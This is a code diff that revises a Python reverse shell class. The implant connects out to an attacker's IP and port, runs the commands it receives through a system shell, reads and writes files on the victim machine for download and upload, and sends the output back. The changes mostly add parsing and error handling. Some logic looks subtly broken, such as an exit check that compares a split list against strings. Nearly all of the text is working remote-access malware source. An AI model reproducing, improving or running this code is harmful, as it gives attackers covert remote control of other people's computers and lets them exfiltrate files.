@@ -29,10 +29,10 @@ class ReverseShell:
         return "[+] Uploaded successfully"
     def sending_data(self,data):
         if isinstance(data,bytes):
-            data =data.decode(self.format)
+            data =base64.b64encode(data).decode(self.format)
         json_data = json.dumps(data)
         self.sock.send(json_data.encode(self.format))
-    
+
     def receiving_data(self):
         json_data =""
         while True:
@@ -42,15 +42,15 @@ class ReverseShell:
             except:
                 continue
 
-            
     def connect(self):
         """Connects to the attacker's machine and waits for commands."""
         try:
             self.sock.connect((self.attacker_ip, self.attacker_port))
             while True:
-                command = self.receiving_data().strip()
-                print(command)
-                if command.lower() in ["exit", "quit"]:
+                command = self.receiving_data().split()
+                if command in ["exit", "quit"]:
+                    self.sock.close()
+                    exit()
                     break
                 output = self.run_command(command)
                 self.sending_data(output)
@@ -62,23 +62,41 @@ class ReverseShell:
     def run_command(self, command):
         """Executes received commands and returns the output."""
         try:
-            if command.startswith("cd "):  # Handle 'cd' separately
-                os.chdir(command[3:])
-                return f"Changed directory to {os.getcwd()}\n"
-            elif command =="exit":
-                self.sock.connect()
-                sys.exit()
-            elif command.startswith("download "):
-                 parts=command.split()
-                 output = self.read_file(parts[1])
-            elif command.startswith("upload "):
-                 command.split()
-                 output = self.write_file(command[1])
+            if command[0] == "cd":
+                try:
+                    os.chdir(command[1])
+                    output = f"Changed directory to {os.getcwd()}\n"
+                except FileNotFoundError:
+                    output = "Error: Directory not found.\n"
+                except PermissionError:
+                    output = "Error: Permission denied.\n"
+
+            elif command[0] == "download":
+                if len(command) > 1:
+                    output = self.read_file(command[1])
+                else:
+                    output = "Error: No file specified for download."
+
+
+            elif command[0] == "upload":
+                if len(command) > 2:
+                    output = self.write_file(command[1], command[2])
+                else:
+                    output = "Error: Invalid upload command format."
+
             else:
-                 output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-        except subprocess.CalledProcessError as e:
-            output = e.output
-        return output
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                except subprocess.CalledProcessError as e:
+                    output = e.output
+                except Exception as e:
+                    output = f"Error executing command: {e}"
+
+        except Exception as e:
+            output = f"Unexpected error: {e}"
+
+        return output  # ✅ Ensures function does NOT exit early
+
 
 if __name__ == "__main__":
     shell = ReverseShell()
